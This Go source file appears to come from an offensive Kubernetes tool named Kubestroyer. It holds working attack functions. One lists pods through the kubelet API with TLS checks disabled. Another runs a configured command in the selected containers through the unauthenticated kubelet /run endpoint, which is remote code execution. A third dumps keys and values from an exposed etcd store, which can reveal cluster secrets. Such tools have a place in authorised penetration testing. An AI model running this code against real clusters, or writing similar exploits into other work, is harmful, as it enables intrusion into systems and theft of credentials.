package pkg

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/AlecAivazis/survey/v2"
	clientv3 "go.etcd.io/etcd/client/v3"
	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/Rolix44/Kubestroyer/utils"
)

func surveyResult(input []string, message string) []string {
	var selectedObjects []string
	prompt := &survey.MultiSelect{
		Message: message,
		Options: input,
	}
	err := survey.AskOne(prompt, &selectedObjects)
	if err != nil {
		log.Fatalln("Failed to select :", err)
		return nil
	}
	return selectedObjects
}

func parsePod(target string) *utils.RunningPods {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get("https://" + target + ":10250/runningpods/")
	if err != nil {
		log.Fatalf("Fail execute request on '%s'", target)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Print("Fail to read body")
	}

	if string(body) == "Unauthorized" {
		log.Fatalln(string(body))
	}

	if strings.HasPrefix(string(body), "Forbidden") {
		log.Fatalln(string(body))
	}

	pods := &utils.RunningPods{}

	err = json.Unmarshal(body, &pods)
	if err != nil {
		log.Fatalln(err)
	}
	return pods

}

func anonRce(target string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	runpod := parsePod(target)

	var containers []string
	for i := 0; i < len(runpod.Items); i++ {
		for j := 0; j < len(runpod.Items[i].Spec.Containers); j++ {
			containers = append(containers, runpod.Items[i].Spec.Containers[j].Name)
		}
	}
	result := surveyResult(containers, "Select pod to RCE")

	fmt.Printf("Trying anon RCE using '%s' for '%s'\n\n", utils.RceCommand, target)

	for _, selectedContainer := range result {
		for i := 0; i < len(runpod.Items); i++ {
			found := false

			for j := 0; j < len(runpod.Items[i].Spec.Containers); j++ {
				namespace := runpod.Items[i].Metadata.Namespace
				pod := runpod.Items[i].Metadata.Name
				container := runpod.Items[i].Spec.Containers[j].Name

				if selectedContainer != container {
					break
				}

				url := "https://" + target + ":10250/run/" + namespace + "/" + pod + "/" + container
				method := "POST"

				fmt.Printf("Namespace : '%s' \nPod : '%s' \nContainer : '%s' \n\n", namespace, pod, container)

				payload := strings.NewReader("cmd=" + utils.RceCommand)

				client := &http.Client{}
				req, err := http.NewRequest(method, url, payload)

				if err != nil {
					fmt.Println(err)
					return
				}
				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

				res, err := client.Do(req)
				if err != nil {
					fmt.Println(err)
					return
				}
				defer res.Body.Close()

				body, err := io.ReadAll(res.Body)
				if err != nil {
					fmt.Println(err)
					return
				}
				if body != nil && !strings.Contains(string(body), "failed") {
					found = true
					fmt.Println(string(body))
					break
				}
			}
			if found {
				break
			}
		}

	}

	fmt.Println(utils.Split)

}

func readEtcdObjects(target string) {
	loggerConfig := zap.Config{
		Level:             zap.NewAtomicLevelAt(zapcore.ErrorLevel),
		Development:       false,
		DisableCaller:     true,
		DisableStacktrace: true,
		Encoding:          "json",
		EncoderConfig: zapcore.EncoderConfig{
			TimeKey:        "ts",
			LevelKey:       "level",
			NameKey:        "logger",
			MessageKey:     "msg",
			StacktraceKey:  "stacktrace",
			LineEnding:     zapcore.DefaultLineEnding,
			EncodeLevel:    zapcore.LowercaseLevelEncoder,
			EncodeTime:     zapcore.EpochMillisTimeEncoder,
			EncodeDuration: zapcore.SecondsDurationEncoder,
		},
		OutputPaths:      []string{"stdout"},
		ErrorOutputPaths: []string{"stderr"},
	}

	logger, err := loggerConfig.Build()
	if err != nil {
		fmt.Printf("Error setting up logger: %v", err)
		return
	}
	zap.ReplaceGlobals(logger)

	cli, err := clientv3.New(clientv3.Config{
		Endpoints:   []string{target + ":2379"},
		DialTimeout: 5 * time.Second,
		Logger:      logger,
	})
	if err != nil {
		if errStatus, ok := status.FromError(err); ok && errStatus.Code() == codes.Unavailable {
			fmt.Println("Cannot connect to etcd: the server might be down or misconfigured")
		} else {
			fmt.Printf("Failed to connect to etcd: %v\n", err)
		}
		return
	}
	defer cli.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	resp, err := cli.Get(ctx, "/", clientv3.WithKeysOnly(), clientv3.WithPrefix())
	if err != nil {
		if errors.Is(err, context.Canceled) {
			fmt.Println("Context canceled")
		} else if errors.Is(err, context.DeadlineExceeded) {
			fmt.Println("Operation timed out")
		} else {
			fmt.Printf("Failed to retrieve keys: %v\n", err)
		}
		return
	}

	var objects []string
	for _, data := range resp.Kvs {
		objects = append(objects, string(data.Key))
	}
	if len(objects) == 0 {
		fmt.Println("No objects found in Etcd")
		return
	}

	selectedObjects := surveyResult(objects, "Select objects to print:")

	for _, selected := range selectedObjects {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		resp, err := cli.Get(ctx, selected)
		cancel()
		if err != nil {
			fmt.Printf("Error fetching value for %s: %v\n", selected, err)
			continue
		}
		fmt.Printf("Value for %s:\n %s\n", selected, resp.Kvs[0].Value)
	}

	fmt.Println(utils.Split)
}
